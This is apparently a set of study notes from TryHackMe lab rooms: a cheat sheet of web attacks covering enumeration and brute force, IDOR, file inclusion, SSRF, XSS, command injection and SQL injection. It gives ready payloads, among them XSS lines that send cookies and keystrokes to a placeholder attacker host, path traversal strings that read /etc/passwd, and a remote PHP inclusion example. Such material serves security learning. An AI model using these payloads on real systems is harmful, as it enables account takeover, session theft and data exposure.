# Enumeration
## Authentication Bypass
| Type | Description | Example |
|-|-|-|
| Username Enumeration | Abuse user authentication by looking at server responses like "An account with this username already exists." | `ffuf -w wordlist.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.220/customers/signup -mr "username already exists"` |
| Brute force | Brute force search for the password from the enumerated user | `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.32.175/customers/login -fc 200` |
| Logic flaws | Abuse faulty code | Exact string matches for `admin` could be `adMIN`. `Password reset forms`, Abuse `Header files` & `requests`, `Off by one errors`, etc.
| Cookie Tampering | Examining and editing the cookies set by the web server during your online session | `curl -H "Cookie: logged_in=true; admin=true" http://10.10.232.83/cookie-test` |

## Exploit IDOR vulns
IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

***Where are they located?***
The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.

Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users' information, for example, /user/details?user_id=123.

| Type | Description | Example |
|-|-|-|
| Basic | Basic example | Change values in links like: `http://online-service.thm/profile?user_id=1305` |
| Encoded IDOR IDs | Web developers will often encode data into some type of ASCII string commonly using a-z, A-Z, 0-9 and = characters for padding | Base64: `{"id":30}` becomes `eyJpZCI6MzB9` |
| Hashed IDs | A bit more complicated to deal with than encoded ones, but they may follow a predictable pattern | md5: `123` becomes `202cb962ac59075b964b07152d234b70` |
| Unpredictable IDs | If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. | Swap `two` account IDs |

## Local File Inclusion (LCI)
### Local
With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. Theoretically, we can access and display any readable file on a server if there isn't any input validation. Let's say we want to read the `/etc/passwd file`, we can try the following: `http://domain.com/get.php?file=/etc/passwd`. In this case, it works because **there isn't a directory specified** in the `include` function and **no input validation**.

| Type | Description | Example |
|-|-|-|
| No specified directory | Get the file just like in a console | `/get.php?file=/etc/passwd` |
| Specified directory | Use path traversal along with error messages to find the file | `/get.php?file=../../../../etc/passwd` |
| Specified extension | Use a `null byte` operator or the current directory trick `/.` to bypass the extension, the `%00` trick is patched and not working with PHP 5.3.4 and above. | `/get.php?file=/etc/passwd%00` |
| Input validation | The web application replaces the ../ with the empty string, the PHP filter only matches and replaces the **first** subset string `../` it finds and **doesn't do another pass**. | `....//....//....//....//....//etc/passwd` |
| Include is forced to read from a defined directory | Simply include the directory into the payload | `/get.php?file=languages/../../../../../etc/passwd` |

### Remote
Include **remote** files into a vulnerable application. One requirement for RFI is that the `allow_url_fopen` option needs to be `on`. The types and examples are  essentially the same as the local file inclusion except we're getting it from a remote server. We could RCE, XSS, DOS, etc. using RFI.

**Example**:

On AttackBox nano a file.txt with contents of: 
```php
<?php
print exec('hostname');
?>
```
Then `python3 -m http.server` and move over to the browser:
`http://10.10.21.255/playground.php?file=http://10.10.86.219:8000/x.txt`

## Server-Side Request Forgery (SSRF)
A vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
There are two types of SSRF vulnerability; the first is a `regular SSRF` where `data is returned to the attacker's screen`. The second is a `Blind SSRF` vulnerability where an SSRF occurs, but `no information is returned to the attacker's screen`.

| Description | Expected request | Hacker request | Server request |
| - | - | - | - |
| URL modification | `http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123` | `http://website.thm/stock?url=http://api.website.thm/api/user` | `http://api.website.thm/api/user` |
| Directory travelsal | `http://website.thm/stock?url=/item?id=123` | `http://website.thm/stock?url=/../user` | `http://api.website.thm/api/stock/../user` |
| Control the subdomain | `http://website.thm/stock?server=api&id=123` | `http://website.thm/stock?server=api.website.thm/api/user&x=&id=123` | `http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123` |
| Remote server requests | `http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123` | `http://website.thm/stock?url=http://hacker-domain.thm` | Gets skipped, instead we get data from `hacker-domain.thm` |

### Spotting an SSRF
1. When a full URL is used in a parameter in the address bar.
2. A hidden field in a form: `<input type="hidden" name="server" value="http://server.website.thm/store">`
3. A partial URL such as just the hostname: `https://website.thm/form?server=api`
4. Or perhaps only the path of the URL: `https://website.thm/form?dst=/forms/contact`

### Defeating Common SSRF Defenses
1. Deny list,  bypass by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.
2. Allow list, circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.
3. Open Redirect, Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

## Cross-site Scripting (XSS)
| Description | Example |
| - | - |
| Proof of Concept | `<script>alert('XSS');</script>` |
| Session Stealing | `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` |
| Key Logger | `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` |
| Business Logic | `<script>user.changeEmail('attacker@hacker.thm');</script>` |

### Reflected XSS
User-supplied data in an HTTP request is included in the webpage source without any validation.

```html
<div class="alert alert-danger">
    <p><script src="https://attacker.thm/evil.js"></script></p>
</div>
```
How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

### Stored XSS
The XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
- Comments on a blog
- User profile information
- Website Listings

### DOM Based XSS
[DOM](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) stands for **Document Object Model** and is a programming interface for `HTML` and `XML` documents.
It represents the `page` so that programs can change the **document structure, style and content**.
A web `page` is a document, and this document can be either displayed in the `browser window` or as the `HTML source`.

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
Execution occurs when the website JavaScript code acts on input or user interaction.

How to test for Dom Based XSS:
1. You'd need to look for parts of the code that access certain `variables` that an attacker can have control over, such as `window.location.x` parameters.
2. When you've found those bits of code, you'd then need to see how they are handled and whether the `values` are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.

### Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view.
However, you can't see the payload working or be able to test it against yourself first.

How to test for Blind XSS:
- Ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
- A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express), this tool will automatically capture cookies, URLs, page contents and more.

### XSS Polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Command Injection
Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with.

Command injection is also often known as “Remote Code Execution” (RCE) because of the ability to remotely execute code within an application.

[Cheat Sheet](https://github.com/payloadbox/command-injection-payload-list)

## SQL Injection
`SQL` (Structured Query Language) Injection, mostly referred to as `SQLi`, is an attack on a web application database server that causes malicious queries to be executed. A database is controlled by a `DBMS`, which is an acronym for  Database Management System.

|SQLi type | Description | Example
| - | - | - |
| In-Band | In-Band just refers to the `same method of communication` being used to exploit the vulnerability and also receive the results.  | Discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page. |
| Blind SQLi | We get little to no feedback to confirm whether our injected queries were, in fact, successful or not | Authentication bypass, boolean based, time based |
| Out-of-band | Isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of `external network call` based on the results from an SQL query. | The attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control. |